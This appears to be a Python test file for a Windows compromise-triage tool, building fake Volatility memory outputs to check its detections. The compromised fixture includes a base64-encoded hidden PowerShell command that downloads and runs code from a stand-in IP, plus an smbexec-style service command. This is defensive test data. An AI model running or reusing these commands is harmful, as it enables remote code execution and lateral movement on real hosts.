# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# La RAM (tc_memoria): le cartelle di collect_memory.py con l'output di Volatility 3, costruite qui
# nello stesso formato del renderer JSON di Volatility (una lista di righe, chiavi in ordine, indentazione
# di 2, i figli in "__children"). Si controllano i segnali, gli esiti dei controlli, gli avvisi quando un
# plugin non e' riuscito, la scelta della RAM giusta per ogni installazione di Windows e la lettura degli
# output delle versioni vecchie di Volatility.
import json
import os
import shutil
import tempfile

import tc_lingua
import tc_memoria
import tc_origine
import tc_controlli
import tc_regole as R

falliti = [0]
fatte = [0]


def prova(condizione, descrizione):
    fatte[0] += 1
    if not condizione:
        falliti[0] += 1
        print 'FALLITA:', descrizione


ORE = '2026-09-28T%s+00:00'
W = u'C:\\Windows\\System32\\'
UTENTE = u'S-1-5-21-1111111111-2222222222-3333333333-1001'


def processo(pid, ppid, nome, riga, ora, percorso=None, uscita=None, sessione=1, thread=8, sid=UTENTE,
             utente=u'mario', in_lista=True, tipo_sessione=u'Console'):
    return {'pid': pid, 'ppid': ppid, 'nome': nome, 'riga': riga, 'ora': ORE % ora, 'percorso': percorso,
            'uscita': ORE % uscita if uscita else None, 'sessione': sessione, 'thread': thread, 'sid': sid,
            'utente': utente, 'in_lista': in_lista, 'tipo_sessione': tipo_sessione}


def base():
    s = lambda **k: dict(sessione=0, sid=u'S-1-5-18', utente=u'SYSTEM', tipo_sessione=None, **k)
    return [
        processo(4, 0, u'System', None, '08:00:00', **s()),
        processo(340, 4, u'smss.exe', u'\\SystemRoot\\System32\\smss.exe', '08:00:01', W + u'smss.exe', **s()),
        processo(520, 432, u'wininit.exe', u'wininit.exe', '08:00:05', W + u'wininit.exe', **s()),
        processo(664, 520, u'services.exe', W + u'services.exe', '08:00:06', W + u'services.exe', **s()),
        processo(684, 520, u'lsass.exe', W + u'lsass.exe', '08:00:06', W + u'lsass.exe', **s()),
        processo(808, 664, u'svchost.exe', W + u'svchost.exe -k DcomLaunch -p', '08:00:07', W + u'svchost.exe', **s()),
        processo(1180, 664, u'svchost.exe', W + u'svchost.exe -k netsvcs -p', '08:00:09', W + u'svchost.exe', **s()),
        processo(3304, 3120, u'explorer.exe', u'C:\\Windows\\Explorer.EXE', '08:03:00', u'C:\\Windows\\explorer.exe'),
        processo(4120, 3304, u'OneDrive.exe', u'"C:\\Users\\mario\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
                 '08:04:00', u'C:\\Users\\mario\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe'),
        processo(5200, 3304, u'cmd.exe', u'"C:\\Windows\\system32\\cmd.exe"', '14:00:00', W + u'cmd.exe'),
        processo(5300, 5200, u'winpmem_mini_x', u'E:\\winpmem_mini_x64_rc2.exe E:\\pc.raw', '14:03:00',
                 u'E:\\winpmem_mini_x64_rc2.exe'),
        processo(4990, 3304, u'notepad.exe', u'notepad.exe', '11:20:00', uscita='11:40:00', thread=0, in_lista=False),
    ]


ENC = u'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBhACcAKQA='


def compromessa():
    return base() + [
        processo(5810, 3304, u'WINWORD.EXE', u'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n x.docm',
                 '13:00:00', u'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'),
        processo(5844, 5810, u'cmd.exe', u'cmd.exe /c powershell -nop -w hidden -enc ' + ENC, '13:01:00', W + u'cmd.exe'),
        processo(5850, 5844, u'powershell.exe', u'powershell -nop -w hidden -enc ' + ENC, '13:01:00',
                 W + u'WindowsPowerShell\\v1.0\\powershell.exe'),
        processo(5904, 5850, u'rundll32.exe', u'rundll32.exe C:\\Users\\Public\\upd.dll,Start', '13:02:00', W + u'rundll32.exe'),
        processo(5990, 3304, u'svchost.exe', u'C:\\Users\\Public\\svchost.exe', '13:05:00', u'C:\\Users\\Public\\svchost.exe'),
        processo(6020, 5844, u'Rubeus.exe', u'C:\\Users\\Public\\Rubeus.exe', '13:06:00', u'C:\\Users\\Public\\Rubeus.exe'),
        processo(6100, 3304, u'AnyDesk.exe', u'"C:\\Users\\mario\\Downloads\\AnyDesk.exe"', '13:10:00',
                 u'C:\\Users\\mario\\Downloads\\AnyDesk.exe'),
        processo(6666, 664, u'updater.exe', u'C:\\ProgramData\\updater.exe -s', '12:50:00', thread=3, in_lista=False,
                 sessione=0, sid=u'S-1-5-18', utente=u'SYSTEM', tipo_sessione=None),
        processo(7000, 5100, u'rdpclip.exe', u'rdpclip', '13:30:00', W + u'rdpclip.exe', sessione=2, utente=u'admin2',
                 sid=u'S-1-5-21-1111111111-2222222222-3333333333-1005', tipo_sessione=u'RDP-Tcp#0'),
    ]


def connessioni(compromessa_):
    c = [(u'TCPv4', u'0.0.0.0', 445, u'0.0.0.0', 0, u'LISTENING', 4, '08:00:00'),
         (u'TCPv6', u'::', 135, u'::', 0, u'LISTENING', 808, '08:00:07'),
         (u'UDPv4', u'0.0.0.0', 5353, u'*', 0, u'', 1180, '08:00:09'),
         (u'TCPv4', u'192.168.10.21', 50110, u'198.51.100.14', 443, u'ESTABLISHED', 4120, '08:05:00'),
         (u'TCPv4', u'192.168.10.21', 50300, u'192.168.10.5', 445, u'ESTABLISHED', 4, '09:40:00')]
    if compromessa_:
        c += [(u'TCPv4', u'192.168.10.21', 51000, u'203.0.113.10', 443, u'ESTABLISHED', 5904, '13:02:00'),
              (u'TCPv4', u'192.168.10.21', 51100, u'198.51.100.80', 443, u'ESTABLISHED', 6100, '13:10:00'),
              (u'TCPv4', u'192.168.10.21', 445, u'10.0.0.50', 52311, u'ESTABLISHED', 4, '13:20:00'),
              (u'TCPv4', u'192.168.10.21', 51200, u'192.0.2.30', 8443, u'SYN_SENT', 6666, '12:51:00')]
    return c


def output(processi, connessioni_, computer, vecchio=False, servizi_extra=()):
    """Le righe di ogni plugin, come le scrive il renderer JSON di Volatility. vecchio: come Volatility 2.4
    e 2.5 (pstree senza Audit, Cmd e Path; cmdline con il motivo al posto della riga illeggibile)."""
    vivi = [p for p in processi if p['in_lista']]
    nomi = dict([(p['pid'], p['nome']) for p in processi])

    def ps(p, i):
        return {'PID': p['pid'], 'PPID': p['ppid'], 'ImageFileName': p['nome'][:14], 'Offset(V)': 2601259008 + i * 2048,
                'Threads': p['thread'], 'Handles': 300 if p['thread'] else None, 'SessionId': p['sessione'],
                'Wow64': False, 'CreateTime': p['ora'], 'ExitTime': p['uscita'], 'File output': u'Disabled',
                '__children': []}

    uscita = {}
    uscita['windows.info'] = [{'Variable': k, 'Value': v, '__children': []} for k, v in (
        (u'Kernel Base', u'0xf80353e00000'), (u'Is64Bit', u'True'), (u'Major/Minor', u'15.22621'),
        (u'SystemTime', u'2026-09-28 14:05:12+00:00'), (u'NtSystemRoot', u'C:\\Windows'),
        (u'NtProductType', u'NtProductWinNt'))]
    uscita['windows.pslist'] = [ps(p, i) for i, p in enumerate(vivi)]
    uscita['windows.psscan'] = [ps(p, i) for i, p in enumerate(processi)]
    albero = []
    for i, p in enumerate(vivi):
        r = ps(p, i)
        del r['File output']
        if not vecchio:
            r['Audit'] = (u'\\Device\\HarddiskVolume3' + p['percorso'][2:]) if p['percorso'] and p['percorso'][1:2] == u':' else None
            r['Cmd'] = p['riga']
            r['Path'] = p['percorso']
        albero.append(r)
    # i figli sotto il padre, come fa pstree
    per_pid = dict([(r['PID'], r) for r in albero])
    radici = []
    for r in albero:
        if r['PPID'] in per_pid and r['PPID'] != r['PID']:
            per_pid[r['PPID']]['__children'].append(r)
        else:
            radici.append(r)
    uscita['windows.pstree'] = radici
    illeggibile = u'Required memory at 0x7ffe0030 is not valid (process exited?)' if vecchio else None
    uscita['windows.cmdline'] = [{'PID': p['pid'], 'Process': p['nome'][:14], 'Args': p['riga'] or illeggibile,
                                  '__children': []} for p in vivi]
    uscita['windows.netscan'] = [{'Offset': 1000 + i, 'Proto': c[0], 'LocalAddr': c[1], 'LocalPort': c[2], 'ForeignAddr': c[3],
                                  'ForeignPort': c[4], 'State': c[5], 'PID': c[6], 'Owner': nomi.get(c[6], u'')[:14],
                                  'Created': ORE % c[7], '__children': []} for i, c in enumerate(connessioni_)]
    uscita['windows.sessions'] = [{'Session ID': p['sessione'], 'Session Type': p['tipo_sessione'], 'Process ID': p['pid'],
                                   'Process': p['nome'][:14], 'User Name': u'%s/%s' % (computer, p['utente']),
                                   'Create Time': p['ora'], '__children': []} for p in vivi]
    uscita['windows.envars'] = []
    for p in vivi:
        for k, v in ((u'COMPUTERNAME', computer), (u'USERNAME', p['utente']), (u'USERDOMAIN', computer)):
            uscita['windows.envars'].append({'PID': p['pid'], 'Process': p['nome'][:14], 'Block': u'0x1d2f0e01b20',
                                             'Variable': k, 'Value': v, '__children': []})
    uscita['windows.getsids'] = []
    for p in vivi:
        uscita['windows.getsids'].append({'PID': p['pid'], 'Process': p['nome'][:14], 'SID': p['sid'], 'Name': p['utente'],
                                          '__children': []})
        uscita['windows.getsids'].append({'PID': p['pid'], 'Process': p['nome'][:14], 'SID': u'S-1-1-0', 'Name': u'Everyone',
                                          '__children': []})
    servizi = [(u'Spooler', u'SERVICE_RUNNING', W + u'spoolsv.exe')] + list(servizi_extra)
    uscita['windows.svcscan'] = [{'Offset': 1, 'Order': i, 'PID': None, 'Start': u'SERVICE_AUTO_START', 'State': stato,
                                  'Type': u'SERVICE_WIN32_OWN_PROCESS', 'Name': nome, 'Display': nome, 'Binary': binario,
                                  'Binary (Registry)': None, 'Dll': None, '__children': []}
                                 for i, (nome, stato, binario) in enumerate(servizi)]
    return uscita


CHIAVI = [(u'info', u'windows.info.Info'), (u'pslist', u'windows.pslist.PsList'), (u'pstree', u'windows.pstree.PsTree'),
          (u'psscan', u'windows.psscan.PsScan'), (u'cmdline', u'windows.cmdline.CmdLine'),
          (u'network', u'windows.netscan.NetScan'), (u'sessions', u'windows.sessions.Sessions'),
          (u'envars', u'windows.envars.Envars'), (u'getsids', u'windows.getsids.GetSIDs'),
          (u'svcscan', u'windows.svcscan.SvcScan')]


def scrivi_raccolta(cartella, uscite, computer, guasti=(), nel_manifesto=True):
    """Una cartella come quella di collect_memory.py. guasti: chiavi dei plugin non riusciti."""
    os.makedirs(cartella)
    voci = []
    for chiave, plugin in CHIAVI:
        nome_file = plugin.rsplit('.', 1)[0] + '.json'
        if chiave in guasti:
            voci.append({'key': chiave, 'plugin': plugin, 'status': 'failed', 'file': None, 'error': 'test'})
            continue
        f = open(os.path.join(cartella, nome_file), 'wb')
        f.write('\n' + json.dumps(uscite[plugin.rsplit('.', 1)[0]], indent=2, sort_keys=True) + '\n')
        f.close()
        voci.append({'key': chiave, 'plugin': plugin, 'status': 'ok', 'file': nome_file, 'rows': 1})
    manifesto = {'format': u'windows-compromise-triage/memory', 'format_version': 1,
                 'image': {'name': u'%s.raw' % computer, 'size': 17179869184, 'sha256': u'ab' * 32},
                 'volatility': {'version': u'2.28.2'}, 'host': {'computer_name': computer if nel_manifesto else None,
                                                               'system_time': None}, 'plugins': voci}
    f = open(os.path.join(cartella, tc_memoria.NOME_MANIFESTO), 'wb')
    f.write(json.dumps(manifesto, indent=2, sort_keys=True))
    f.close()


def triage_di(cartella, prefisso=u'/LogicalFileSet1/'):
    o = tc_origine.OrigineCartella(cartella, prefisso)
    radici, _ = tc_origine.trova_radici(o)
    t = tc_controlli.Triage(radici[0])
    t.memorie = [tc_memoria.Memoria(o, e, u'origine', True) for e in tc_memoria.trova(o)]
    t.esegui()
    return t


def segnali(t, controllo=None):
    return [s for s in t.segnali if controllo is None or s.controllo == controllo]


def ha(t, controllo, peso, frammento, famiglia=None):
    for s in segnali(t, controllo):
        if s.peso == peso and frammento in s.descrizione and (famiglia is None or s.famiglia == famiglia):
            return True
    return False


radice = tempfile.mkdtemp()
try:
    tc_lingua.imposta(tc_lingua.ITALIANO)
    # 1. orari di Volatility
    rif = tc_memoria.ora_da_iso(u'2026-09-28T14:05:12+00:00')
    prova(rif > 0, 'orario ISO')
    for testo in (u'2026-09-28 14:05:12+00:00', u'2026-09-28T14:05:12.123456+00:00', u'2026-09-28T16:05:12+02:00',
                  u'2026-09-28T12:05:12-02:00', u'2026-09-28T14:05:12Z', u'2026-09-28T14:05:12'):
        prova(int(tc_memoria.ora_da_iso(testo)) == int(rif), 'orario %s' % testo)
    for testo in (None, u'', u'N/A', 12, u'1601-01-01T00:00:00+00:00'):
        prova(tc_memoria.ora_da_iso(testo) == 0, 'orario non valido %r' % (testo,))

    # 2. una RAM compromessa, in un'origine dati che contiene solo quella
    c = os.path.join(radice, 'compromessa')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(compromessa(), connessioni(True), u'PC-A',
                    servizi_extra=[(u'XbRtQwPk', u'SERVICE_RUNNING',
                                    u'%COMSPEC% /Q /c echo dir ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %SYSTEMROOT%\\XbRtQwPk.bat')]),
                    u'PC-A')
    t = triage_di(c)
    prova(t.verdetto == tc_controlli.V_COMPROMESSA, 'verdetto della RAM compromessa: %s' % t.verdetto)
    prova(t.contesto.get('computer') == u'PC-A', 'computer dalla RAM')
    prova(ha(t, 4, R.DECISIVO, u'Rubeus.exe', R.F_STRUMENTI), 'strumento d\'attacco nei processi')
    prova(ha(t, 4, R.DECISIVO, u'-enc', R.F_ESECUZIONE), 'PowerShell codificato che scarica codice')
    prova(ha(t, 4, R.DA_CONFERMARE, u'updater.exe', R.F_ANTIFORENSE), 'processo nascosto')
    prova(not [s for s in segnali(t, 4) if u'notepad' in s.descrizione], 'processo terminato non e\' nascosto')
    prova(ha(t, 4, R.DA_CONFERMARE, u'svchost.exe con un processo padre insolito: explorer.exe'), 'padre di svchost')
    prova(ha(t, 4, R.DA_CONFERMARE, u'svchost.exe (PID 5990)'), 'svchost fuori da System32')
    prova(ha(t, 4, R.DA_CONFERMARE, u'cmd.exe avviato da winword.exe'), 'Word che apre cmd')
    prova(ha(t, 5, R.DA_CONFERMARE, u'rundll32.exe ha una connessione verso l\'indirizzo pubblico 203.0.113.10:443'),
          'rundll32 verso Internet')
    prova(ha(t, 5, R.DA_CONFERMARE, u'192.0.2.30:8443', R.F_ANTIFORENSE), 'connessione del processo nascosto')
    prova(ha(t, 3, R.INFORMATIVO, u'PC-A/admin2'), 'sessione RDP')
    prova(ha(t, 29, R.DECISIVO, u'XbRtQwPk'), 'servizio con la firma di smbexec')
    prova(u'AnyDesk' in t.rmm and t.rmm[u'AnyDesk']['prove'][0]['genere'] == 'eseguito', 'AnyDesk tra gli RMM')
    prova(not [s for s in t.segnali if u'winpmem' in s.descrizione.lower() or u'onedrive' in s.descrizione.lower()],
          'acquisizione della RAM e OneDrive non segnalati')
    for n in (3, 4, 5, 7):
        prova(t.esiti.get(n, ('',))[0] == 'fatto', 'controllo %d fatto' % n)
    prova(t.esiti.get(6, ('',))[0] == 'non verificabile', 'cache DNS non verificabile')
    prova([x for x in t.tabelle if x.controllo == 7 and len(x.righe) == 2], 'tabella SMB con due connessioni')
    prova([x for x in t.tabelle if x.controllo == 5 and [r for r in x.righe if r[1] == u'[::]:135']],
          'indirizzo IPv6 tra parentesi')
    prova(t.contesto.get('memorie') and t.contesto['memorie'][0]['riusciti'] == 10, 'contesto della RAM')
    prova(not [a for a in t.avvisi if u'RAM' in a], 'nessun avviso sulla RAM')
    struttura_it = sorted([(s.controllo, s.peso, s.famiglia, s.extra) for s in t.segnali])

    # 3. la stessa RAM in inglese: stessi segnali
    tc_lingua.imposta(tc_lingua.INGLESE)
    t_en = triage_di(c)
    prova(sorted([(s.controllo, s.peso, s.famiglia, s.extra) for s in t_en.segnali]) == struttura_it, 'stessi segnali in inglese')
    prova(ha(t_en, 4, R.DA_CONFERMARE, u'svchost.exe with an unusual parent process'), 'testo inglese')
    tc_lingua.imposta(tc_lingua.ITALIANO)

    # 4. una RAM pulita: nessun segnale
    c = os.path.join(radice, 'pulita')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    t = triage_di(c)
    prova(not [s for s in t.segnali if s.peso >= R.DA_CONFERMARE], 'RAM pulita senza segnali: %s'
          % [s.descrizione for s in t.segnali][:3])
    prova(t.esiti.get(4, ('',))[0] == 'fatto', 'RAM pulita: controllo 4 fatto')

    # 5. output di una versione vecchia di Volatility (2.4, 2.5)
    c = os.path.join(radice, 'vecchia')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(compromessa(), connessioni(True), u'PC-A', vecchio=True), u'PC-A')
    t = triage_di(c)
    prova(ha(t, 4, R.DECISIVO, u'Rubeus.exe'), 'Volatility vecchio: percorso dalla riga di comando')
    prova(not [s for s in t.segnali if u'Required memory' in s.descrizione], 'Volatility vecchio: righe illeggibili ignorate')

    # 6. plugin non riusciti
    c = os.path.join(radice, 'guasti')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(compromessa(), connessioni(True), u'PC-A'), u'PC-A',
                    guasti=(u'psscan', u'network', u'getsids'))
    t = triage_di(c)
    avvisi = [a for a in t.avvisi if u'plugin di Volatility senza risultati' in a]
    prova(len(avvisi) == 1 and u'Controlli incompleti: 4, 5, 7.' in avvisi[0], 'avviso dei plugin non riusciti: %s' % avvisi)
    prova(t.esiti.get(5, ('',))[0] == 'non verificabile' and t.esiti.get(7, ('',))[0] == 'non verificabile',
          'connessioni non verificabili')
    prova(not [s for s in t.segnali if u'nascosto' in s.descrizione], 'senza psscan nessun processo nascosto')
    prova(ha(t, 4, R.DECISIVO, u'Rubeus.exe'), 'gli altri controlli continuano')

    # 7. manifesto danneggiato e file mancante
    c = os.path.join(radice, 'rotta')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    f = open(os.path.join(c, 'PC-A_vol3', tc_memoria.NOME_MANIFESTO), 'wb')
    f.write('{"format": "windows-compromise-triage/memory", "plugins": [')
    f.close()
    t = triage_di(c)
    prova([a for a in t.avvisi if u'non si possono usare' in a and u'JSON' in a], 'manifesto danneggiato')
    prova(t.esiti.get(4, ('',))[0] == 'non verificabile', 'manifesto danneggiato: controllo 4 non verificabile')
    c = os.path.join(radice, 'mancante')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    os.remove(os.path.join(c, 'PC-A_vol3', 'windows.netscan.json'))
    t = triage_di(c)
    prova([a for a in t.avvisi if u'windows.netscan (file non trovato)' in a], 'file mancante: %s' % t.avvisi)

    # 8. senza RAM i controlli 3-7 restano non verificabili
    vuota = os.path.join(radice, 'vuota')
    os.makedirs(vuota)
    t = triage_di(vuota)
    prova(t.esiti.get(4, ('',))[0] == 'non verificabile' and u'Volatility' in t.esiti[4][1], 'senza RAM')

    # 9. quale RAM per quale installazione di Windows
    c = os.path.join(radice, 'scelta')
    scrivi_raccolta(os.path.join(c, 'b'), output(compromessa(), connessioni(True), u'PC-B'), u'PC-B')
    scrivi_raccolta(os.path.join(c, 'a'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    scrivi_raccolta(os.path.join(c, 'senza'), output(base(), connessioni(False), u'PC-A'), u'PC-A', nel_manifesto=False)
    o = tc_origine.OrigineCartella(c, u'/LogicalFileSet1/')
    altra = tc_origine.OrigineCartella(os.path.join(radice, 'compromessa'), u'/LogicalFileSet2/')
    trovate = dict([(e.cartella, e) for e in tc_memoria.trova(o)])
    prova(len(trovate) == 3, 'tre manifesti trovati')

    def scelta(computer, piatta, memorie, unica=True):
        r = tc_origine.Radice(o, u'' if piatta else u'/logicalfileset1/c/', None, piatta=piatta)
        r.unica = unica
        t = tc_controlli.Triage(r)
        t.contesto['computer'] = computer
        t.memorie = memorie
        tc_memoria.analizza(t)
        return t

    def memoria(cartella, stessa=True, origine=None):
        if origine is None:
            return tc_memoria.Memoria(o, trovate[u'/LogicalFileSet1/%s/' % cartella], u'origine', stessa)
        return tc_memoria.Memoria(origine, tc_memoria.trova(origine)[0], u'altra', stessa)

    t = scelta(u'PC-A', False, [memoria('b'), memoria('a')])
    prova([m['computer'] for m in t.contesto.get('memorie', [])] == [u'PC-A'], 'si usa solo la RAM di PC-A')
    prova([x for x in t.note if u'altro computer (PC-B' in x], 'nota sulla RAM di PC-B')
    t = scelta(u'pc-a', False, [memoria('a')])
    prova(len(t.contesto.get('memorie', [])) == 1, 'nome del computer senza maiuscole')
    # nell'altra origine c'e' la RAM compromessa di PC-A
    t = scelta(u'PC-B', False, [memoria(None, False, altra)])
    prova(not t.contesto.get('memorie') and not t.note, 'la RAM di un altro computer in un\'altra origine non si usa')
    t = scelta(u'PC-A', False, [memoria(None, False, altra)])
    prova(len(t.contesto.get('memorie', [])) == 1 and [x for x in t.note if u'altra origine dati' in x],
          'la RAM dello stesso computer in un\'altra origine si usa, con una nota')
    prova(not [s for s in t.segnali if s.elemento is not None], 'segnali di un\'altra origine senza file')
    m = memoria('senza')
    t = scelta(u'PC-A', False, [m])
    prova(len(t.contesto.get('memorie', [])) == 1 and m.computer == u'PC-A', 'nome del computer dalle variabili d\'ambiente')
    t = scelta(u'', False, [memoria('a')])
    prova(len(t.contesto.get('memorie', [])) == 1 and [x for x in t.note if u'non si \u00e8 potuto confrontare' in x],
          'senza nome nel registro: la RAM della stessa origine, con una nota')
    t = scelta(u'', False, [memoria('a')], unica=False)
    prova(not t.contesto.get('memorie'), 'senza nome e con piu\' installazioni non si sceglie')
    t = scelta(u'', True, [memoria('b'), memoria('a')])
    prova([x['computer'] for x in t.contesto.get('memorie', [])] == [u'PC-B'] and [x for x in t.note if u'(PC-A' in x],
          'origine con le RAM di due computer: si analizza la prima')
finally:
    shutil.rmtree(radice, ignore_errors=True)
    tc_lingua.imposta(tc_lingua.ITALIANO)

print 'memoria: %d prove, prove fallite %d' % (fatte[0], falliti[0])
